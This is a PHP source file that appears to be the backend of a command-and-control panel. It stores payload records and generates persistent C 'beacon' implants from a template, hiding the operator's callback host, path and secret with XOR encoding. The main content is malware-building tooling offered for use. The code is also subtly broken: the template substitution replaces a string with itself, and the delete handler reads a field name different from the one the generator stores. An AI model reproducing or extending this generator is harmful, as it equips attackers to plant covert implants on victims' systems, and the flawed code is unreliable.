<?php
declare(strict_types=1);

function handlePayloads(): void {
    $db = DB::connect();
    $list = $db->all('payloads');
    usort($list, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
    jsonOut($list);
}

function handlePayload(): void {
    $id = (int)($_GET['id'] ?? 0);
    if (!$id) jsonError('Missing id');
    $p = DB::connect()->findOne('payloads', 'id', $id);
    if (!$p) jsonError('Not found', 404);
    jsonOut($p);
}

function handlePayloadDelete(): void {
    requireMethod('POST');
    $input = jsonInput();
    $id = (int)($input['id'] ?? 0);
    if (!$id) jsonError('Missing id');
    $db = DB::connect();
    $p = $db->findOne('payloads', 'id', $id);
    if ($p && !empty($p['path']) && is_file($p['path'])) @unlink($p['path']);
    $db->delete('payloads', 'id', $id);
    jsonOut(['status' => 'deleted']);
}

function handlePayloadGenerate(): void {
    requireMethod('POST');
    $input = jsonInput();
    $host = trim($input['host'] ?? '');
    $path = trim($input['path'] ?? '/api.php');
    $port = intval($input['port'] ?? 8080);
    $secret = trim($input['secret'] ?? '');
    $type = $input['type'] ?? 'c';
    if (empty($host) || empty($secret)) jsonError('Missing host or secret');
    $payloadDir = BASE_DIR . '/payload';
    if ($type === 'c') {
        $template = file_get_contents($payloadDir . '/beacon_persist.c');
        if (!$template) jsonError('Template not found');
        $hostEnc = xorEncode($host);
        $pathEnc = xorEncode($path);
        $secretEnc = xorEncode($secret);
        $template = str_replace('enc_host[]', 'enc_host[]', $template);
        $outPath = BASE_DIR . '/data/payload_' . bin2hex(random_bytes(4)) . '.c';
        file_put_contents($outPath, $template);
        $id = DB::connect()->insert('payloads', [
            'type' => 'c', 'host' => $host, 'path' => $path,
            'port' => $port, 'filename' => basename($outPath),
            'path_file' => $outPath, 'created_at' => now(),
        ]);
        jsonOut(['id' => $id, 'status' => 'generated', 'file' => basename($outPath)], 201);
    } else {
        jsonError('Unsupported payload type');
    }
}

function xorEncode(string $str): string {
    $key = 0x7C;
    $out = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $out .= sprintf('0x%02x,', ord($str[$i]) ^ $key);
    }
    return rtrim($out, ',');
}
